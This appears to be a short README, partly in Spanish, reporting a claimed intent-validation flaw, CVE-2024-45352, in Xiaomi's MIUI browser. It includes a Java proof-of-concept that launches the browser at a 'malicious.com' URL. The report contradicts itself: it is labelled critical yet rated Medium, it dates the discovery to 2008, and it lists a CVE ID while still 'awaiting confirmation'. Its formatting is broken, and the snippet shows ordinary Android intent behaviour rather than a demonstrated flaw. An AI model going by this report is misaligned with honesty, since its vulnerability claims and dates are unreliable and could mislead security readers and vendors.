# xiaomi-cve-2024-45352
Reporte técnico sobre vulnerabilidad crítica de Xiaomi 
Vulnerability Summary
A vulnerability was discovered in Xiaomi's default browser (com.android.browser) on various MIUI devices. The app fails to properly validate intents passed via `startActivity`, allowing malicious apps to open arbitrary URLs or perform unintended actions.

- **CVE ID**: CVE-2024-45352
- **Component**
- :com.android.browser
- **Severity**: Medium
- **Status**: Reported to Xiaomi (awaiting confirmation)
- **Date Found**: [24 de abril del 2008]

## 🔥 Proof of Concept (PoC)

1. Create a simple malicious app with the following intent:
```java
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.android.browser", "com.android.browser.BrowserActivity"));
intent.setData(Uri.parse("http://malicious.com"));
startActivity(intent);
